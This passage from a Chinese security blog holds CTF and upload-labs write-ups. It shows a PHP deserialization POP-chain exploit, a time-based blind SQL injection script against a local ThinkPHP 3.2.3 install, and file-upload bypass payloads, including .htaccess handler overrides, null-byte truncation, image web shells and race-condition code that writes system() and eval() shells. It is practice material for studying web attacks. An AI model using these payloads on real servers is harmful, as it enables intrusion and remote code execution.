class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里涉及到一个叫pop链的构造问题，下面这篇文章就讲的很详细了<code>https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html</code>，简单来说就是当关键的代码不在魔术方法的时候而是在一些类的普通方法里面的时候，可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。这里需要满足两个条件：</p><ol><li>关键代码不在魔术方法里</li><li>普通的方法里面必须要有相同函数名</li></ol><p>观察关键代码，发现要实现读文件的功能，得先满足下面的条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">      &#123;</span><br><span class="line">          $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">          <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">          &#123;              </span><br><span class="line">              <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>因为两个类都存在read函数这个时候就很可以先构造pop链，因为skyobj是个protected类型的变量，只能使用对象注入了，这样无论是private还是public都可以控制，但是aaa的值会变化，所以需要使用引用使bbb动态跟着aaa。先构造amazing</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing;</span><br><span class="line"></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line">$a-&gt;bbb =&amp;$a-&gt;aaa;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>;</span><br></pre></td></tr></table></figure><p>最终的exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;    </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'./flag.php'</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>; </span><br><span class="line">&#125;   </span><br><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/06/kYRMtg.png" alt="kYRMtg.png"></p><h4 id="Simple-PHP"><a href="#Simple-PHP" class="headerlink" title="Simple PHP"></a>Simple PHP</h4><p>感觉题目玩坏了。。。。</p><p>反正看了看一叶飘零大佬的题解，考的是一个SQL约束攻击，以及一个tp3.2的一个注入，看起来是个报错注入，还是很有意思的一个题目。自己把源码下下来自己复现一下23333，他这个代码里面关键是有一个options变量是可控的，这修复的方案也是不再引用外部的可控变量</p><p>源码下载:<a href="http://www.thinkphp.cn/download/610.html" target="_blank" rel="noopener">http://www.thinkphp.cn/download/610.html</a></p><p>下面是自己搭建该环境(phpstudy)的测试过程</p><p><img src="https://s2.ax1x.com/2019/02/06/kYT2ff.png" alt="kYT2ff.png"></p><p><img src="https://s2.ax1x.com/2019/02/06/kYI7uj.png" alt="kYI7uj.png"></p><p><img src="https://s2.ax1x.com/2019/02/06/kYI58S.png" alt="kYI58S.png"></p><p>再尝试一下飘零大哥的方法,利用了一个时间盲注的方法，tql(破音)~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">45</span>,<span class="number">127</span>):</span><br><span class="line">url = <span class="string">'http://127.0.0.1/thinkphp3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1 and if((ascii(substr((select pass from user limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(j)+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(url=url,timeout=<span class="number">2.5</span>)</span><br><span class="line"><span class="keyword">print</span> url</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += chr(j)</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>同样也能跑出结果</p><p><img src="https://s2.ax1x.com/2019/02/06/kYTbt0.png" alt="kYTbt0.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个月的安恒月赛好像很有意思
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs记录</title>
    <link href="0verwatch.top/upload-labs-wp.html"/>
    <id>0verwatch.top/upload-labs-wp.html</id>
    <published>2019-02-03T08:55:03.000Z</published>
    <updated>2019-02-13T13:53:17.703Z</updated>
    
    <content type="html"><![CDATA[<p>闲来无聊，把upload-labs所有的关卡都刷一遍<a id="more"></a>，就当复习一下文件上传漏洞的各种绕过技巧吧，做完一关再看看源代码提高一下审计能力挺好的</p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>一个前端检测，可以禁用js，也可以直接抓包就可以绕过上传</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ9HYQ.png" alt="kJ9HYQ.png"></p><p>访问成功</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ9zwT.png" alt="kJ9zwT.png"></p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>Content-Type绕过，直接把Content-Type改为图片类型即可</p><p><img src="https://s2.ax1x.com/2019/02/04/kJCA61.png" alt="kJCA61.png"></p><p>上传成功</p><p><img src="https://s2.ax1x.com/2019/02/04/kJCmTO.png" alt="kJCmTO.png"></p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>这一关是另类的文件名的绕过，可以尝试phtml，php3，php4, php5, pht后缀名都可以绕过，但是前提是要在配置文件里面有这样的一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJCIj1.png" alt="kJCIj1.png"></p><p>成功回显</p><p><img src="https://s2.ax1x.com/2019/02/04/kJC7B6.png" alt="kJC7B6.png"></p><p>源码里面直接用的黑名单。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br></pre></td></tr></table></figure><p>当然还有第二种方法</p><p>就是上传<code>.htaccess</code>，实现重写文件解析,同样这样的前提也是得在配置文件里面有这样的一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>上面的方法已经不行了，可以看一下他过滤的名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br></pre></td></tr></table></figure><p>比刚才的黑名单多了不少，但是<code>.htaccess</code>还是没有过滤，可以重写文件解析规则绕过，上传一个<code>.htaccess</code>，文件内容如下，就是在upload目录下匹配gg.jpg的文件并以php文件执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;gg.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJPput.png" alt="kJPput.png"></p><p>然后再上传一个名字为gg.jpg的脚本</p><p><img src="https://s2.ax1x.com/2019/02/04/kJVbM4.png" alt="kJVbM4.png"></p><p>然后访问成功执行</p><p><img src="https://s2.ax1x.com/2019/02/04/kJZgfK.png" alt="kJZgfK.png"></p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>这一题里面多过滤了<code>.htaccess</code>，如何绕过呢？</p><p><img src="https://s2.ax1x.com/2019/02/04/kJmaqJ.png" alt="kJmaqJ.png"></p><p>对比一下代码可以知道，可以使用大小写绕过，因为这里把原来转换成小写的那一部分给删掉了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJmBI1.png" alt="kJmBI1.png"></p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>这一关比第五关少了这样的一句代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>所以可以后缀名+空格的形式去绕过</p><p><img src="https://s2.ax1x.com/2019/02/04/kJnO1K.png" alt="kJnO1K.png"></p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>对比第6题的代码可以发现少了下面一句代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure><p>既然没有对文件最后的点做过滤，可以尝试以后缀名加上点的形式去绕过</p><p><img src="https://s2.ax1x.com/2019/02/04/kJKZ26.png" alt="kJKZ26.png"></p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>这一题的代码比上一次少了下面这一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>这个是关于windows下文件的流特性，可以参考一下这篇文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream</span><br></pre></td></tr></table></figure><p>这样一来就是说这东西应该只能在Windows下运行了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ1FOK.png" alt="kJ1FOK.png"></p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>这一关像是前几关的组合拳，虽然把最后的点给删掉，但是仍然可以绕过，因为这里的过滤并没有递归下去，只是一步，这样就相当于SQL注入里面用str_replace只过滤一次关键字一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>可以遵循着他的步骤去实现自己的payload，可以这样设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.php. .</span><br></pre></td></tr></table></figure><p>这样一来检测到最后的文件名是<code>4.php.</code>这样就相当于第七关了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ1zB8.png" alt="kJ1zB8.png"></p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>关键过滤的代码就这两句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">   $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br></pre></td></tr></table></figure><p>跟我上一关讲的SQL注入的类型差不多，就是双写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.pphphp</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJ3yKP.png" alt="kJ3yKP.png"></p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>关键的代码在于这里的’save_path’是一个可控的变量，但是后面还拼接上一个后缀名，也需要绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p>这个时候可以使用%00截断，但这东西有点过气了，因为需要两个条件</p><ol><li>php版本小于5.3.4</li><li>php的magic_quotes_gpc为OFF状态</li></ol><p>如果要完成这一个题目就必须要实现上面的两个条件，但是现在都PHP7了，这东西也就很少见了，满足上面的条件的时候php就是把它当成结束符，后面的数据直接忽略，这也导致了很多的问题，文件包含也可以利用这一点</p><p>所以如果要绕过，我们可以这样去实现，另save_path等于下面的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../upload/4.php%00</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcCUH.png" alt="kJcCUH.png"></p><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>这里的源代码就改了一点点，就是把get改为post类型，一样的方式绕过，只不过这里需要在二进制里面修改%00，因为post不会像get对%00进行自动解码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcP5d.png" alt="kJcP5d.png"></p><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>从这一关开始要求上传图片马，但是没有办法直接执行图片马，需要另外的方法去实现一般是加上php伪协议去getshell，常见的有phar，zip等等<br>如果想要看到详细的效果可以写一下简单的脚本放在upload目录下即可，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">include</span> $_GET[file];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最最最简单的图片马直接一条命令即可生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.jpg /b + shell.php /a webshell.jpg</span><br></pre></td></tr></table></figure><p>上传一个图片马，内容如下，可以看到里面有脚本语言</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcYrT.png" alt="kJcYrT.png"></p><p>把该图片上传上去，尝试文件包含，成功回显</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcaa4.png" alt="kJcaa4.png"></p><p>这里可以发现源代码只是用了unpack这一个函数去实现对于php前两个字节的检测，也就是只是对文件头做检测。。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);</span><br></pre></td></tr></table></figure><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>类似上一个题目,获取了图片的相关的大小及类型，并验证是否时刻上传的图片，同样可以使用文件头的方式绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$info = getimagesize($filename);</span><br><span class="line">$ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJchid.png" alt="kJchid.png"></p><p>说明info[2]是一个文件的类型，同样的方法也是可以绕过的</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcrxx.png" alt="kJcrxx.png"></p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>换了一个获取图片信息的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcLdg.png" alt="kJcLdg.png"></p><p>跟pass-13一样的绕过方法</p><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>这一关对后缀名和文件类型啥的都进行了很严格的控制，而且在后面还对图片进行了二次编译</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">$im = imagecreatefromjpeg($target_path);</span><br></pre></td></tr></table></figure><p>这一个题目跟上次校赛的题目思路一致，寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传，下载下来后发现这一部分插入代码的没变但是其他部分都变了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJgrkQ.png" alt="kJgrkQ.png"></p><p>尝试文件包含，后面怎么利用就不多说了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJgq6x.png" alt="kJgq6x.png"></p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>这一关是条件竞争的问题，查看源代码就会发现你需要在缓存文件转移到别的目录的时候，赶紧访问它，这里可以使用burp去发包，可以把文件内容改成下面这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $c=fopen(<span class="string">'./cmd.php'</span>,<span class="string">'w'</span>);fwrite($c,<span class="string">'&lt;?php system($_GET["f"]);?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>或者这样，反正就是为了写文件进去就对了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd]?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJ2d3R.png" alt="kJ2d3R.png"></p><p>两个burp跑一跑，就会在该文件夹下面产生新的文件了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ2Du6.png" alt="kJ2Du6.png"></p><p>访问成功</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ2W8A.png" alt="kJ2W8A.png"></p><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>同样的也是一个条件竞争的问题，看一下源代码可以发现这里使用类去实现相关方法，包括查看文件后缀名，大小等等</p><p>这里面的问题存在于代码将上传文件更改名字的时候给了个时间差，让我们可以去实现这个竞争效果，同样的方法，不都说</p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>这一关正常做法应该是CVE-2015-2348 move_uploaded_file() 00截断，上传webshell，同时自定义保存名称</p><p>上传的文件名用0x00绕过。改成<code>xx.php【二进制00】.x.jpg</code></p><p>但是发现了一种更有意思的解法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 